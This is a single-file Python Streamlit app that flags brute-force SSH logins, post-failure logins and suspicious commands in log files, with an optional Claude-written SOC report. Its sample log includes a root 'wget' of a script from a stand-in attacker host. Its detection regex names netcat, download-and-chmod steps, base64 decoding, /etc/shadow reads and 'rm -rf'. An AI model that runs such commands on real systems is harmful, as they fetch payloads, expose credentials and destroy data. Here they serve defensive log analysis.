# AI Log Analyzer - single file version
# Run:  pip install streamlit anthropic pandas
#       streamlit run app.py
import json, os, re
from collections import Counter
import pandas as pd
import streamlit as st

SAMPLE = """2026-10-07 09:01:12 sshd Failed password for root from 203.0.113.9
2026-10-07 09:01:15 sshd Failed password for root from 203.0.113.9
2026-10-07 09:01:19 sshd Failed password for admin from 203.0.113.9
2026-10-07 09:01:25 sshd Failed password for root from 203.0.113.9
2026-10-07 09:02:02 sshd Accepted password for root from 203.0.113.9
2026-10-07 09:05:40 sudo user root ran: wget http://evil.example/x.sh
2026-10-07 09:10:22 sshd Accepted publickey for alice from 10.0.0.5"""

FAILED = re.compile(r"Failed password for (?:invalid user )?(\S+) from (\S+)")
ACCEPTED = re.compile(r"Accepted (\w+) for (\S+) from (\S+)")
BAD_CMD = re.compile(r"(wget|curl|nc |netcat|chmod \+x|base64 -d|/etc/shadow|rm -rf)")


def rule_analysis(logs):
    """STEP 1: rules find threats and a risk score (no AI)."""
    lines = [l for l in logs.splitlines() if l.strip()]
    by_ip, users, findings, risk = Counter(), Counter(), [], 0
    for line in lines:
        m = FAILED.search(line)
        if m:
            users[m.group(1)] += 1
            by_ip[m.group(2)] += 1
    for ip, n in by_ip.items():
        if n >= 3:
            findings.append(f"Brute-force: {n} failed logins from {ip}")
            risk += 30
    for line in lines:
        m = ACCEPTED.search(line)
        if m:
            method, user, ip = m.groups()
            if ip in by_ip:
                findings.append(f"Login for '{user}' from {ip} AFTER failures (possible compromise)")
                risk += 40
            if user == "root" and method == "password":
                findings.append("Root login with password")
                risk += 10
        if BAD_CMD.search(line) and not FAILED.search(line):
            findings.append(f"Suspicious command: {line.strip()[:100]}")
            risk += 20
    risk = min(risk, 100)
    sev = "critical" if risk >= 80 else "high" if risk >= 50 else "medium" if risk >= 20 else "low"
    return {"lines": len(lines), "failed_by_ip": dict(by_ip), "findings": findings,
            "risk": risk, "severity": sev}


def offline_report(s):
    return {"severity": s["severity"], "source": "rules-only",
            "summary": f"{len(s['findings'])} issue(s) found. Risk {s['risk']}/100 ({s['severity']}).",
            "findings": s["findings"] or ["No obvious threats"],
            "actions": ["Block offending IPs", "Use SSH keys, disable passwords",
                        "Reset credentials of affected accounts"]}


def llm_report(logs, stats, key):
    """STEP 2: LLM explains the findings."""
    import anthropic
    prompt = ("You are a SOC analyst. Reply ONLY with JSON: "
              '{"severity":"low|medium|high|critical","summary":"2-3 sentences",'
              '"findings":["..."],"actions":["..."],"attack_stage":"..."}\n\n'
              f"RULE RESULTS: {json.dumps(stats)}\n\nLOGS:\n{logs[:8000]}")
    msg = anthropic.Anthropic(api_key=key).messages.create(
        model="claude-sonnet-5-5", max_tokens=1200,
        messages=[{"role": "user", "content": prompt}])
    text = msg.content[0].text.replace("```json", "").replace("```", "").strip()
    r = json.loads(text)
    r["source"] = "LLM (Claude)"
    return r


def analyze(logs, key=""):
    stats = rule_analysis(logs)
    if key:
        try:
            return stats, llm_report(logs, stats, key)
        except Exception as e:
            r = offline_report(stats)
            r["source"] = f"rules-only (LLM error: {e})"
            return stats, r
    return stats, offline_report(stats)


if __name__ == "__main__":
    st.set_page_config(page_title="AI Log Analyzer", page_icon="🛡️", layout="wide")
    st.title("🛡️ AI Log Analyzer")
    key = st.sidebar.text_input("Anthropic API key (optional)", type="password",
                                value=os.getenv("ANTHROPIC_API_KEY", ""))
    st.sidebar.info("No key = rules-only mode.")
    logs = st.text_area("Paste logs here", SAMPLE, height=200)
    up = st.file_uploader("...or upload a .log/.txt file", type=["log", "txt"])
    if up:
        logs = up.read().decode("utf-8", errors="ignore")
    if st.button("Analyze", type="primary"):
        stats, rep = analyze(logs, key)
        a, b, c = st.columns(3)
        a.metric("Risk", f"{stats['risk']}/100")
        b.metric("Severity", rep["severity"].upper())
        c.metric("Lines", stats["lines"])
        st.caption(f"Source: {rep['source']}")
        st.subheader("Summary")
        st.write(rep["summary"])
        l, r = st.columns(2)
        l.subheader("Findings")
        for f in rep["findings"]:
            l.warning(f)
        r.subheader("Actions")
        for x in rep["actions"]:
            r.success(x)
        if stats["failed_by_ip"]:
            st.subheader("Failed logins by IP")
            st.bar_chart(pd.Series(stats["failed_by_ip"]))
